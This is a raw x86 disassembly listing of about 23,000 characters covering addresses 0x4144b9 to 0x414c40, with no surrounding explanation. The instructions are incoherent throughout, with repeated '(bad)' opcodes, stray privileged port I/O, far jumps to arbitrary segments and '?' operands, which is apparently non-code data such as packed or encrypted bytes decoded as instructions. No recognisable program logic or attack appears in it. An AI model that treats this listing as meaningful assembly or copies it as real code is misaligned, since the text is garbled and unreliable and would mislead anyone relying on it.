  4144b9:	fild   DWORD PTR [esi+ecx*2]
  4144bc:	push   eax
  4144bd:	jmp    0x11e0:0x593b0759
  4144c4:	add    edi,DWORD PTR [ecx+0x68]
  4144c7:	pusha  
  4144c8:	sbb    BYTE PTR [ebx],dl
  4144ca:	je     0x41451d
  4144cc:	dec    eax
  4144cd:	xor    DWORD PTR [eax+0x6c],esp
  4144d0:	(bad)  
  4144d1:	fnstcw WORD PTR [esi]
  4144d3:	jno    0x41452b
  4144d5:	cmp    al,0x10
  4144d7:	push   ds
  4144d8:	(bad)  
  4144da:	xchg   ebp,eax
  4144db:	sub    ah,BYTE PTR [ebx+ecx*4]
  4144de:	sub    al,0x34
  4144e0:	adc    dh,BYTE PTR ds:0xc4849d82
  4144e6:	cmc    
  4144e7:	or     cl,BYTE PTR [edi+0x6c]
  4144ea:	cld    
  4144eb:	add    ch,BYTE PTR [ebp-0x567e8c]
  4144f1:	das    
  4144f2:	fwait
  4144f3:	inc    eax
  4144f4:	cmp    eax,0x637ae1d7
  4144f9:	jno    0x414535
  4144fb:	cdq    
  4144fc:	xchg   edx,eax
  4144fd:	cmp    BYTE PTR [edx+0x26],ch
  414500:	fadd   st(0),st
  414502:	in     al,dx
  414503:	mov    al,0xa8
  414505:	ds sbb edi,0x6397254c
  41450c:	call   FWORD PTR [ebp+0x1cf9a8b5]
  414512:	int    0xad
  414514:	sahf   
  414515:	inc    DWORD PTR [eax+0x6bc0ca88]
  41451b:	mov    ecx,0xe120bd31
  414520:	mov    esp,0x6f67e713
  414525:	mov    dh,0xb3
  414527:	add    eax,0x95039674
  41452c:	shl    DWORD PTR [eax],0xe2
  41452f:	cli    
  414530:	xor    BYTE PTR [eax+0x75ddeb9e],0x14
  414537:	pop    ecx
  414538:	pusha  
  414539:	in     al,0xe3
  41453b:	call   0x66c4:0x55667a73
  414542:	cwde   
  414543:	leave  
  414544:	mov    ds:0x5b34972,al
  414549:	mov    cl,0x9
  41454b:	jecxz  0x4144e8
  41454d:	mov    DWORD PTR [esi-0x7c9f6675],edx
  414553:	add    al,0x4a
  414555:	lahf   
  414556:	clc    
  414557:	mov    bh,0xd3
  414559:	xchg   esi,eax
  41455a:	mov    ch,0x67
  41455c:	jo     0x41457b
  41455e:	inc    esp
  41455f:	test   al,0x3e
  414561:	mov    esp,0x32c4daab
  414566:	adc    ch,BYTE PTR [ebp-0x5be303e5]
  41456c:	test   eax,0xf3cdeed4
  414571:	and    dl,BYTE PTR [ebx+0x5f7cbe6e]
  414577:	(bad)  
  414578:	in     al,dx
  414579:	outs   dx,BYTE PTR ds:[esi]
  41457a:	jmp    0x414558
  41457c:	bound  eax,QWORD PTR [edi]
  41457e:	pop    ebp
  41457f:	retf   
  414580:	sub    DWORD PTR [ebx+0x1a],esp
  414583:	in     eax,0x59
  414585:	inc    ebx
  414586:	out    0xc6,eax
  414588:	or     DWORD PTR [edx-0x5f9a60b],eax
  41458e:	aam    0xf2
  414590:	or     ebx,DWORD PTR [eax-0x3e]
  414593:	and    eax,0x3f330c0b
  414598:	icebp  
  414599:	push   ds
  41459a:	mov    edx,DWORD PTR [ecx+eax*8+0x4c87d6e4]
  4145a1:	adc    dh,al
  4145a3:	cdq    
  4145a4:	dec    edi
  4145a5:	fisttp DWORD PTR [ecx+0x54]
  4145a8:	adc    eax,0x392ca9cc
  4145ad:	lods   al,BYTE PTR ds:[esi]
  4145ae:	bound  ebx,QWORD PTR [ebx+0x59]
  4145b1:	sti    
  4145b2:	jae    0x4145b2
  4145b4:	mov    ah,BYTE PTR [edx+0x72eeb363]
  4145ba:	bound  eax,QWORD PTR [edi+edx*1]
  4145bd:	fdivr  DWORD PTR [esi-0x27]
  4145c0:	and    eax,DWORD PTR [ebx+esi*8-0x9]
  4145c4:	loop   0x414567
  4145c6:	mov    ebx,0x87f4f2d5
  4145cb:	popa   
  4145cc:	int3   
  4145cd:	cwde   
  4145ce:	cld    
  4145cf:	out    dx,al
  4145d0:	mov    esp,DWORD PTR [edx+0xf7db43a]
  4145d6:	jno    0x4145ab
  4145d8:	jmp    0x414626
  4145da:	pop    ebx
  4145db:	into   
  4145dc:	pop    ss
  4145dd:	lahf   
  4145de:	dec    eax
  4145df:	call   0x219a52a8
  4145e4:	clc    
  4145e5:	outs   dx,BYTE PTR ds:[esi]
  4145e6:	sbb    eax,0xe4f8138a
  4145eb:	adc    BYTE PTR [esi+0x4f],bh
  4145ee:	xchg   esi,eax
  4145ef:	mov    esi,0xaa81b66f
  4145f4:	push   es
  4145f5:	inc    ebp
  4145f6:	outs   dx,DWORD PTR ds:[esi]
  4145f7:	inc    ebp
  4145f8:	enter  0x90f9,0xb6
  4145fc:	mov    eax,cs
  4145fe:	cmc    
  4145ff:	xchg   BYTE PTR [ecx],dh
  414601:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414603:	int    0xf
  414605:	xchg   esi,eax
  414606:	fisubr DWORD PTR [ecx+eax*4+0x470ed659]
  41460d:	push   esi
  41460e:	test   dl,0xa8
  414611:	add    BYTE PTR ds:0xdf1c26fe,0x6b
  414618:	pop    ebp
  414619:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41461a:	push   ecx
  41461b:	std    
  41461c:	xchg   esi,eax
  41461d:	out    dx,al
  41461e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41461f:	fisub  WORD PTR [edx-0x6b]
  414622:	fs pop esi
  414624:	pop    ecx
  414625:	lea    eax,[eax+0x11]
  414628:	xor    esp,DWORD PTR [ebx+0x6a]
  41462b:	cdq    
  41462c:	cmp    ebp,DWORD PTR [esi+0x18a82474]
  414632:	push   cs
  414633:	and    eax,DWORD PTR [ebx+eiz*4-0x7c491f0e]
  41463a:	out    dx,al
  41463b:	sbb    BYTE PTR [edx-0x37],dl
  41463e:	mov    esi,0xf6572e95
  414643:	hlt    
  414644:	dec    ebp
  414645:	xchg   esp,eax
  414646:	repz (bad) 
  414648:	out    0xff,eax
  41464a:	mov    eax,0x6afb4e34
  41464f:	retf   
  414650:	mov    cl,0xab
  414652:	int3   
  414653:	and    eax,0xedadf488
  414658:	and    ecx,DWORD PTR ds:0x6a608f3d
  41465e:	gs fcmovnbe st,st(0)
  414661:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414662:	sbb    BYTE PTR [eax-0x1c43589e],bl
  414668:	loop   0x4146e3
  41466a:	je     0x414611
  41466c:	add    DWORD PTR [edx-0x6a5a6c0b],ebp
  414672:	repz mov ah,0xc
  414675:	jbe    0x4146de
  414677:	pop    es
  414678:	push   ecx
  414679:	xor    ebx,ecx
  41467b:	mov    ds:0xe3961f3c,al
  414680:	bound  esp,QWORD PTR [edi+0x151b5bc6]
  414686:	ins    DWORD PTR es:[edi],dx
  414687:	lock xchg DWORD PTR [edi],eax
  41468a:	dec    ebx
  41468b:	adc    eax,0x26f2e2a0
  414690:	dec    ebx
  414691:	jle    0x4146d0
  414693:	fs icebp 
  414695:	pushf  
  414696:	cmc    
  414697:	fadd   QWORD PTR [ebp-0x2768454b]
  41469d:	xor    BYTE PTR [edi-0x59],cl
  4146a0:	push   ebp
  4146a1:	add    dl,bh
  4146a3:	imul   ebx,DWORD PTR fs:[eax-0x14804f0c],0x9f717f66
  4146ae:	imul   edi,DWORD PTR [eax-0x27acd94a],0xffffffd1
  4146b5:	adc    al,0x32
  4146b7:	xchg   esi,eax
  4146b8:	mov    dh,BYTE PTR [esi-0x76fca61b]
  4146be:	mov    al,0x41
  4146c0:	dec    ebp
  4146c1:	(bad)  
  4146c2:	fisub  WORD PTR [edx+0x29]
  4146c5:	arpl   bx,bx
  4146c7:	dec    ebx
  4146c8:	jnp    0x414683
  4146ca:	dec    edx
  4146cb:	dec    edx
  4146cc:	popa   
  4146cd:	and    eax,0x159a9992
  4146d2:	xor    dh,dl
  4146d4:	rcr    DWORD PTR [eax-0x31],cl
  4146d7:	sub    bl,cl
  4146d9:	xchg   DWORD PTR [eax-0x50],ebp
  4146dc:	sbb    al,0xf0
  4146de:	xchg   edx,eax
  4146df:	sbb    al,0xc3
  4146e1:	in     al,dx
  4146e2:	(bad)  
  4146e3:	bound  esp,QWORD PTR [edi]
  4146e5:	add    DWORD PTR [esi-0x4c],0xaf66e1c2
  4146ec:	outs   dx,DWORD PTR ds:[esi]
  4146ed:	cmp    BYTE PTR [edx],bh
  4146ef:	xor    ebp,DWORD PTR [eax-0x14]
  4146f2:	add    al,0xf2
  4146f4:	mov    ?,WORD PTR [edx+0x439a46f3]
  4146fa:	pop    ds
  4146fb:	icebp  
  4146fc:	shr    DWORD PTR [ebx+edx*2],cl
  4146ff:	in     eax,0x51
  414701:	mov    ah,0x8b
  414703:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414704:	cli    
  414705:	dec    esi
  414706:	sub    eax,0xeb3b38ee
  41470b:	hlt    
  41470c:	xchg   ebx,eax
  41470d:	mov    edi,0xd239aba3
  414712:	sub    DWORD PTR [eax],eax
  414714:	jo     0x41477d
  414716:	add    dl,BYTE PTR [ecx]
  414718:	cmp    esi,0xec259668
  41471e:	out    dx,eax
  41471f:	sub    eax,0xbd617b87
  414724:	retf   
  414725:	xor    ebx,DWORD PTR [eax*1-0x6ae5e534]
  41472c:	daa    
  41472d:	es sbb eax,0xbd2db4f8
  414733:	xchg   ebp,eax
  414734:	mov    BYTE PTR [edx-0x6185bc0e],dh
  41473a:	sbb    DWORD PTR [edi-0x7bda7202],0x791a2271
  414744:	adc    DWORD PTR [ecx-0x13],esp
  414747:	cmp    esp,esi
  414749:	je     0x414733
  41474b:	jae    0x4146f8
  41474d:	scas   al,BYTE PTR es:[edi]
  41474e:	sbb    eax,0xdb5adca4
  414753:	dec    eax
  414754:	outs   dx,DWORD PTR ds:[esi]
  414755:	js     0x4146fc
  414757:	adc    al,BYTE PTR [eax-0x4a0be110]
  41475d:	mov    ds:0x19744e17,al
  414762:	data16 xor BYTE PTR [edi+0x272335f8],bh
  414769:	push   esi
  41476a:	dec    eax
  41476b:	test   al,0xec
  41476d:	pop    ecx
  41476e:	dec    edi
  41476f:	fs stos DWORD PTR es:[edi],eax
  414771:	std    
  414772:	outs   dx,BYTE PTR ds:[esi]
  414773:	fwait
  414774:	aad    0xd4
  414776:	ja     0x414732
  414778:	and    ch,BYTE PTR [edx+0x196074b3]
  41477e:	push   ebp
  41477f:	stos   BYTE PTR es:[edi],al
  414780:	push   ebx
  414781:	mov    edi,0xb1ea1a3c
  414786:	fldenv [eax]
  414788:	not    BYTE PTR [edi]
  41478a:	js     0x414805
  41478c:	cli    
  41478d:	test   al,0xe3
  41478f:	sub    eax,0xd78a1bb1
  414794:	inc    eax
  414795:	fadd   QWORD PTR [edx]
  414797:	pop    edi
  414798:	and    dl,BYTE PTR [esi+eiz*4]
  41479b:	sub    cl,dh
  41479d:	sub    dl,BYTE PTR [edx+0x3c]
  4147a0:	scas   eax,DWORD PTR es:[edi]
  4147a1:	stos   BYTE PTR es:[edi],al
  4147a2:	call   0x5fc3:0xc2fedd0a
  4147a9:	(bad)  
  4147aa:	mov    ebp,0x4b6c5f4d
  4147af:	push   eax
  4147b0:	mov    eax,0x7f5c820
  4147b5:	das    
  4147b6:	inc    ebp
  4147b7:	in     al,dx
  4147b8:	mov    dh,0x50
  4147bb:	dec    ecx
  4147bc:	fwait
  4147bd:	cdq    
  4147be:	xchg   edi,eax
  4147bf:	lods   eax,DWORD PTR ds:[esi]
  4147c0:	adc    eax,0xa02fb9fc
  4147c5:	sbb    DWORD PTR [edx-0x1b],edi
  4147c8:	scas   al,BYTE PTR es:[edi]
  4147c9:	test   DWORD PTR [ebp+0x6c590bfa],ecx
  4147cf:	arpl   bp,cx
  4147d1:	xchg   edx,eax
  4147d2:	add    eax,0x3edcad28
  4147d7:	mov    al,fs:0x85d8c2f9
  4147dd:	jg     0x4147f3
  4147df:	stos   DWORD PTR es:[edi],eax
  4147e0:	cmp    bh,BYTE PTR [edi-0x62]
  4147e3:	jae    0x414809
  4147e5:	cmp    DWORD PTR [ecx-0x3f542044],ecx
  4147eb:	mov    ecx,0xf3e4afc6
  4147f0:	add    bh,BYTE PTR [esi]
  4147f2:	sbb    eax,0x6c1c43a5
  4147f7:	jbe    0x414793
  4147f9:	and    al,al
  4147fb:	xor    al,0x2e
  4147fd:	dec    ebp
  4147fe:	add    al,0x19
  414800:	xor    al,dl
  414802:	inc    esp
  414803:	js     0x414822
  414805:	add    eax,0x793578d6
  41480a:	(bad)  
  41480b:	sbb    bh,bl
  41480d:	pop    ebp
  41480e:	xchg   BYTE PTR [ecx],cl
  414810:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414811:	stos   DWORD PTR es:[edi],eax
  414812:	dec    eax
  414813:	jne    0x4147c1
  414815:	and    eax,0x864d23df
  41481a:	inc    edi
  41481b:	aaa    
  41481c:	sub    eax,0x12f028b3
  414821:	xor    al,0x46
  414823:	fiadd  DWORD PTR [eax+0x395c13b2]
  414829:	fistp  QWORD PTR [ebp+0x67]
  41482c:	push   es
  41482d:	fnsave [edx]
  41482f:	adc    bh,bl
  414831:	int    0xd9
  414833:	sahf   
  414834:	scas   eax,DWORD PTR es:[edi]
  414835:	aaa    
  414836:	aam    0x50
  414838:	cdq    
  414839:	es jno 0x414876
  41483c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41483d:	inc    esi
  41483e:	fcomp  QWORD PTR [ebp+0x76]
  414841:	dec    eax
  414842:	mov    ah,0x3
  414844:	daa    
  414845:	cli    
  414846:	dec    esi
  414847:	fwait
  414848:	push   ebx
  414849:	jecxz  0x4148ab
  41484b:	xlat   BYTE PTR ds:[ebx]
  41484c:	hlt    
  41484d:	in     al,0x2f
  41484f:	fistp  WORD PTR [eax+0x33]
  414852:	test   DWORD PTR [ebp+0x713ce92a],0x8e902243
  41485c:	jae    0x4148bf
  41485e:	test   DWORD PTR [esi-0x7],0xc00b8aca
  414865:	fstp   QWORD PTR [ebx-0xb90855b]
  41486b:	repnz scas al,BYTE PTR es:[edi]
  41486d:	sbb    bl,BYTE PTR [edi-0x5f]
  414870:	in     al,0xac
  414872:	daa    
  414873:	stc    
  414874:	ret    0x163a
  414877:	enter  0xbc0a,0xb9
  41487b:	and    ch,cl
  41487d:	popa   
  41487e:	mov    edx,DWORD PTR [edx+0x13]
  414881:	add    al,0x9
  414883:	mov    ah,0xa4
  414885:	or     DWORD PTR [edx],esi
  414887:	repnz pop esi
  414889:	jns    0x4148b0
  41488b:	cdq    
  41488c:	in     al,0x63
  41488e:	dec    edx
  41488f:	and    esp,DWORD PTR [ebx+0x1]
  414892:	fisubr DWORD PTR [ecx-0x5]
  414895:	into   
  414896:	test   eax,0x43050ba8
  41489b:	cli    
  41489c:	or     al,0xe
  41489e:	cli    
  41489f:	sbb    ah,BYTE PTR [eax]
  4148a1:	clc    
  4148a2:	bound  edi,QWORD PTR [esi+0x70]
  4148a5:	lods   eax,DWORD PTR ds:[esi]
  4148a6:	or     BYTE PTR [edx+0x2c2f80f2],dh
  4148ac:	js     0x41492b
  4148ae:	pop    ebp
  4148af:	mov    eax,ds:0xd7d4cc4d
  4148b4:	adc    al,0x3
  4148b6:	imul   BYTE PTR [eax-0x8]
  4148b9:	sbb    BYTE PTR [ebx-0x11],bl
  4148bc:	fstp   DWORD PTR [eax]
  4148be:	and    ch,BYTE PTR ds:0x5f3124bc
  4148c4:	aam    0x58
  4148c6:	push   0xffffffad
  4148c8:	push   es
  4148c9:	outs   dx,DWORD PTR ds:[esi]
  4148ca:	dec    edx
  4148cb:	loopne 0x4148b5
  4148cd:	daa    
  4148ce:	dec    edi
  4148cf:	je     0x4148eb
  4148d1:	inc    ebp
  4148d2:	xor    al,0x8c
  4148d4:	or     dl,dh
  4148d6:	mov    ebp,0x3d3104f9
  4148db:	sti    
  4148dc:	mov    al,ds:0xcf277efb
  4148e1:	cwde   
  4148e2:	test   BYTE PTR [esi-0x29],bh
  4148e5:	mov    WORD PTR [ecx],?
  4148e7:	dec    esi
  4148e8:	or     ebx,ebx
  4148ea:	(bad)  
  4148eb:	xchg   esi,eax
  4148ec:	mov    esp,0x5f49468f
  4148f1:	not    DWORD PTR [ebp-0x2d1f1df0]
  4148f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148f8:	inc    ebp
  4148f9:	mov    bl,ch
  4148fb:	cdq    
  4148fc:	cmp    ebx,DWORD PTR [ebx+ebp*8-0x1a15bada]
  414903:	mov    DWORD PTR ds:0x2966dcd7,edx
  414909:	ss inc ebx
  41490b:	or     BYTE PTR [ecx+eiz*2+0x7848b6b2],al
  414912:	dec    BYTE PTR [edx]
  414914:	dec    ebx
  414915:	ins    DWORD PTR es:[edi],dx
  414916:	test   eax,0xebe669c1
  41491b:	loop   0x4148b2
  41491d:	sbb    eax,0x8740045
  414922:	cli    
  414923:	in     eax,dx
  414924:	xchg   ebx,eax
  414925:	fdivr  QWORD PTR [edi-0x6336d677]
  41492b:	outs   dx,DWORD PTR ds:[esi]
  41492c:	push   es
  41492d:	jg     0x4148af
  41492f:	dec    esp
  414930:	ror    BYTE PTR [eax-0x5fc784d2],cl
  414936:	add    bh,BYTE PTR [edi]
  414938:	dec    esp
  414939:	push   0x604637b4
  41493e:	ficom  WORD PTR [esi]
  414940:	jnp    0x41495b
  414942:	mov    BYTE PTR [eax-0x6d],0xed
  414946:	xchg   ecx,eax
  414947:	inc    ecx
  414948:	data16 outs dx,BYTE PTR ds:[esi]
  41494a:	inc    ebp
  41494b:	push   ds
  41494c:	jnp    0x414977
  41494e:	iret   
  41494f:	jb     0x414936
  414951:	cmp    DWORD PTR [ebx+0x45],0x60c9bd7b
  414958:	pop    edi
  414959:	mov    WORD PTR [ecx],fs
  41495b:	push   edi
  41495c:	scas   al,BYTE PTR es:[edi]
  41495d:	das    
  41495e:	dec    ecx
  41495f:	mov    bh,0xc9
  414961:	test   DWORD PTR [eax+0x6b],0xaf516dd0
  414968:	mov    cl,0xa1
  41496a:	adc    ah,cl
  41496c:	mov    dl,0x4b
  41496e:	rcl    BYTE PTR [eax],1
  414970:	mov    bl,dl
  414972:	cmp    al,0xc5
  414974:	das    
  414975:	mov    DWORD PTR [eax-0x7e344484],edx
  41497b:	mov    esp,DWORD PTR cs:[edi+0x59]
  41497f:	push   ebx
  414980:	jno    0x41493f
  414982:	add    al,0x24
  414984:	repnz call 0xc41a:0x85ed0ae8
  41498c:	add    ebx,DWORD PTR [edi]
  41498e:	pusha  
  41498f:	add    BYTE PTR [ebx+0x318be918],0xb8
  414996:	dec    esi
  414997:	jb     0x414970
  414999:	in     eax,dx
  41499a:	push   esi
  41499b:	mov    ds:0x4a70a4c3,eax
  4149a0:	dec    eax
  4149a1:	adc    al,0x76
  4149a3:	inc    ebp
  4149a4:	pop    edx
  4149a5:	aaa    
  4149a6:	inc    edi
  4149a7:	dec    esi
  4149a8:	data16 ficom DWORD PTR [ebp-0x298adadc]
  4149af:	xchg   ebp,eax
  4149b0:	push   edx
  4149b1:	fs xchg edi,eax
  4149b3:	pop    ecx
  4149b4:	(bad)  
  4149b6:	adc    BYTE PTR [ebx-0x10],0x28
  4149ba:	aaa    
  4149bb:	mov    eax,ds:0x289d0af7
  4149c0:	push   cs
  4149c1:	xchg   esp,eax
  4149c2:	repnz (bad)
  4149c5:	mov    ebp,0x20e8a918
  4149ca:	xchg   ebx,eax
  4149cb:	dec    edi
  4149cc:	repnz in al,dx
  4149ce:	outs   dx,BYTE PTR ds:[esi]
  4149cf:	shl    DWORD PTR [ebp+0x2baf15e3],0xfd
  4149d6:	jge    0x4149b7
  4149d8:	div    ebp
  4149da:	out    dx,eax
  4149db:	bnd jb 0x4149c4
  4149de:	adc    eax,0x19d9f5bb
  4149e3:	test   DWORD PTR [ebx],ebp
  4149e5:	pop    es
  4149e6:	xor    eax,0x995dd554
  4149eb:	cld    
  4149ec:	neg    DWORD PTR [ebx-0x71]
  4149ef:	lahf   
  4149f0:	rol    BYTE PTR [eax],0x46
  4149f3:	add    ecx,ebp
  4149f5:	int3   
  4149f6:	jne    0x414997
  4149f8:	mov    bh,0x52
  4149fa:	fst    DWORD PTR [edi+0x17d5b03a]
  414a00:	ins    BYTE PTR es:[edi],dx
  414a01:	cmp    al,0xb6
  414a03:	xchg   esi,eax
  414a04:	jp     0x4149ad
  414a06:	or     BYTE PTR [ebp-0x26],0xd9
  414a0a:	stc    
  414a0b:	pop    es
  414a0c:	std    
  414a0d:	mov    al,ds:0x73b36132
  414a12:	pop    es
  414a13:	push   ebx
  414a14:	dec    ecx
  414a15:	mov    ?,WORD PTR [ebp+0x72]
  414a18:	xlat   BYTE PTR ds:[ebx]
  414a1a:	aaa    
  414a1b:	or     ah,ch
  414a1d:	out    dx,al
  414a1e:	sub    eax,0xa6e349c0
  414a23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a24:	pop    esp
  414a25:	xlat   BYTE PTR ds:[ebx]
  414a26:	mov    ds:0x90ef7711,eax
  414a2b:	aaa    
  414a2c:	cmc    
  414a2d:	mov    ah,0x17
  414a2f:	retf   0x6757
  414a32:	or     eax,0xcd49dd20
  414a37:	jo     0x4149db
  414a39:	(bad)  
  414a3a:	fwait
  414a3b:	pop    edx
  414a3c:	xor    al,0x27
  414a3e:	sub    esp,DWORD PTR [edi]
  414a40:	das    
  414a41:	mov    bh,0x89
  414a43:	pop    ss
  414a44:	mov    ds:0x4391683b,eax
  414a49:	xchg   BYTE PTR [eax+0x296ec9e2],ch
  414a4f:	mov    ah,0xf
  414a51:	dec    edx
  414a52:	ja     0x414a38
  414a54:	fld    QWORD PTR [esi]
  414a56:	adc    BYTE PTR ds:0x29dd7ec7,bh
  414a5c:	sbb    ebp,DWORD PTR ds:0xca0b63f2
  414a62:	jle    0x414a1f
  414a64:	inc    ebp
  414a65:	div    BYTE PTR [ebp-0x7]
  414a68:	add    BYTE PTR [ecx-0x7e],dh
  414a6b:	repz cmc 
  414a6d:	jmp    0x55a2c5cd
  414a72:	scas   al,BYTE PTR es:[edi]
  414a73:	ror    DWORD PTR [ebx-0x39cc1bab],0xe9
  414a7a:	jo     0x414a9f
  414a7c:	add    BYTE PTR [eax],al
  414a7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a7f:	xchg   esi,eax
  414a80:	retf   
  414a81:	dec    eax
  414a82:	mov    esp,edi
  414a84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a85:	xchg   esp,eax
  414a86:	dec    ecx
  414a87:	(bad)  
  414a88:	mov    ah,0x80
  414a8a:	jbe    0x414aea
  414a8c:	jnp    0x414aae
  414a8e:	out    dx,eax
  414a8f:	inc    edi
  414a90:	popa   
  414a91:	bound  ecx,QWORD PTR [edx]
  414a93:	pop    edi
  414a94:	bound  esp,QWORD PTR [edx-0x62]
  414a97:	jne    0x414aec
  414a99:	pushf  
  414a9a:	sbb    esp,ebx
  414a9c:	push   edx
  414a9d:	xchg   BYTE PTR [ebp+0x76fb485c],bl
  414aa3:	pop    esi
  414aa4:	sahf   
  414aa5:	stc    
  414aa6:	cwde   
  414aa7:	push   ss
  414aa8:	stc    
  414aa9:	fcomp  QWORD PTR [esi]
  414aab:	lock ss jmp 0x935f:0x71b9554a
  414ab4:	out    dx,al
  414ab5:	test   DWORD PTR [edx],0xfb006880
  414abb:	ins    BYTE PTR es:[edi],dx
  414abc:	adc    al,0x74
  414abe:	mov    edi,0xf5ec0ca2
  414ac3:	push   0x16834925
  414ac8:	retf   
  414ac9:	ret    
  414aca:	sub    BYTE PTR [edi+0x4f],0x6e
  414ace:	sub    eax,0xb265402
  414ad3:	pop    ds
  414ad4:	ret    
  414ad5:	outs   dx,BYTE PTR ds:[esi]
  414ad6:	inc    ecx
  414ad7:	pushf  
  414ad8:	aam    0x97
  414ada:	or     edi,DWORD PTR [ecx+0x1a]
  414add:	fs pop edi
  414adf:	rcl    ecx,0x6e
  414ae2:	leave  
  414ae3:	and    BYTE PTR [ecx-0x4e],ah
  414ae6:	or     al,0x79
  414ae8:	adc    BYTE PTR [edx+0x3b],0xa2
  414aec:	mov    ch,0x7
  414aee:	xchg   edi,eax
  414aef:	xor    eax,DWORD PTR [edx+0x62e85c0a]
  414af5:	jo     0x414b35
  414af7:	fsubr  QWORD PTR [ebp-0x1216905d]
  414afd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414afe:	cmp    dh,BYTE PTR [edi]
  414b00:	mov    ds:0x743f555e,al
  414b05:	sbb    edi,DWORD PTR [ecx+ebx*4+0x3dbdb253]
  414b0c:	scas   al,BYTE PTR es:[edi]
  414b0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414b0e:	stos   DWORD PTR es:[edi],eax
  414b0f:	lock shr eax,1
  414b12:	or     edx,ecx
  414b14:	into   
  414b15:	fstp   QWORD PTR [ecx]
  414b17:	repz ret 
  414b19:	imul   DWORD PTR [esi-0x67]
  414b1c:	stc    
  414b1d:	scas   eax,DWORD PTR es:[edi]
  414b1e:	push   ecx
  414b1f:	pusha  
  414b20:	cmp    ebp,DWORD PTR [ecx-0x58c7f8d7]
  414b26:	shr    DWORD PTR [esi+0xaf269fa],0x19
  414b2d:	lea    ecx,[edi]
  414b2f:	add    ch,BYTE PTR [eax+0x55]
  414b32:	cs pop ebx
  414b34:	add    dl,BYTE PTR [esp+eax*8+0x6c]
  414b38:	xor    BYTE PTR [edx+0x52],ah
  414b3b:	test   eax,0xe74120a8
  414b40:	into   
  414b41:	ror    BYTE PTR [edi+0x4e8dbc47],1
  414b47:	iret   
  414b48:	(bad)  
  414b49:	or     eax,0xe5bd84e6
  414b4e:	cmp    dh,BYTE PTR ds:0x47c38065
  414b54:	(bad)
  414b57:	mov    dl,0x14
  414b59:	inc    esi
  414b5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414b5b:	mov    ds:0x60213a96,al
  414b60:	js     0x414ba4
  414b62:	out    dx,eax
  414b63:	nop
  414b64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b65:	fstp   TBYTE PTR ds:0xeb268058
  414b6b:	pop    edx
  414b6c:	sbb    eax,0x70725f70
  414b71:	fsubr  DWORD PTR [ecx+0x539e883a]
  414b77:	hlt    
  414b78:	jl     0x414b4d
  414b7a:	iret   
  414b7b:	push   ebp
  414b7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414b7d:	adc    DWORD PTR [esi+0x76],ebx
  414b80:	das    
  414b81:	push   esi
  414b82:	inc    edi
  414b83:	dec    edx
  414b84:	popa   
  414b85:	mov    edi,ebp
  414b87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b88:	dec    edx
  414b89:	jnp    0x414b44
  414b8b:	dec    edi
  414b8c:	aam    0x9f
  414b8e:	imul   eax,DWORD PTR [edi-0x78],0x66
  414b92:	ror    ch,0xbc
  414b95:	push   ecx
  414b96:	out    dx,eax
  414b97:	push   edx
  414b98:	call   0x356c34aa
  414b9d:	add    eax,0xf4170da
  414ba2:	xchg   ebp,eax
  414ba3:	push   ecx
  414ba4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ba5:	nop
  414ba6:	cmp    bh,BYTE PTR [edx]
  414ba8:	leave  
  414ba9:	xor    eax,ecx
  414bab:	sbb    ebp,DWORD PTR [ebx-0x33]
  414bae:	dec    esp
  414baf:	jmp    0x3a25:0xa19b9772
  414bb6:	and    eax,0x2672b254
  414bbb:	jmp    0x8994:0xfa2f738b
  414bc2:	push   edi
  414bc3:	push   ebx
  414bc4:	leave  
  414bc5:	in     al,0x3d
  414bc7:	mov    bh,0x7c
  414bc9:	stc    
  414bca:	in     eax,0xbc
  414bcc:	and    al,dh
  414bce:	add    cl,BYTE PTR [ebx]
  414bd0:	add    eax,DWORD PTR [edi+edi*1+0x4a]
  414bd4:	in     al,0xab
  414bd6:	fidiv  WORD PTR [esi+ebx*1]
  414bd9:	jns    0x414beb
  414bdb:	inc    ecx
  414bdc:	(bad)  
  414bde:	clc    
  414bdf:	stos   DWORD PTR es:[edi],eax
  414be0:	stos   DWORD PTR es:[edi],eax
  414be1:	xor    eax,0x867dd32f
  414be6:	mov    ecx,0x421547f8
  414beb:	mov    cl,bl
  414bed:	add    al,0x6f
  414bef:	push   ebx
  414bf0:	adc    eax,0xa3790a21
  414bf5:	inc    esi
  414bf6:	out    0xd3,al
  414bf8:	lds    ebx,FWORD PTR [ebx-0x54]
  414bfb:	into   
  414bfc:	iret   
  414bfd:	pop    ecx
  414bfe:	pop    eax
  414bff:	ins    DWORD PTR es:[edi],dx
  414c00:	mov    edi,0x8435bab0
  414c05:	jns    0x414bcb
  414c07:	in     al,0xfb
  414c09:	push   ebx
  414c0a:	ret    
  414c0b:	cmp    dh,BYTE PTR [ebx+edx*1]
  414c0e:	xor    ah,cl
  414c10:	dec    edi
  414c11:	mov    dh,0xf5
  414c13:	xchg   esi,eax
  414c14:	loopne 0x414c5a
  414c16:	push   edi
  414c17:	jb     0x414c28
  414c19:	xchg   edi,eax
  414c1a:	hlt    
  414c1b:	imul   edi,DWORD PTR [esi],0x4e
  414c1e:	inc    eax
  414c1f:	xchg   edx,eax
  414c20:	xor    edi,0x45
  414c23:	mov    bl,0xa7
  414c25:	mov    dl,0xdf
  414c27:	rcl    ch,0x7f
  414c2a:	push   cs
  414c2b:	sbb    BYTE PTR [eax],0x66
  414c2e:	test   BYTE PTR [esi-0x230da2a],al
  414c34:	pop    ecx
  414c35:	sub    al,0x31
  414c37:	xchg   edi,eax
  414c38:	sbb    eax,0x6d333707
  414c3d:	fild   WORD PTR [ebx+0x32]
  414c40:	repz jp 0x414bc8
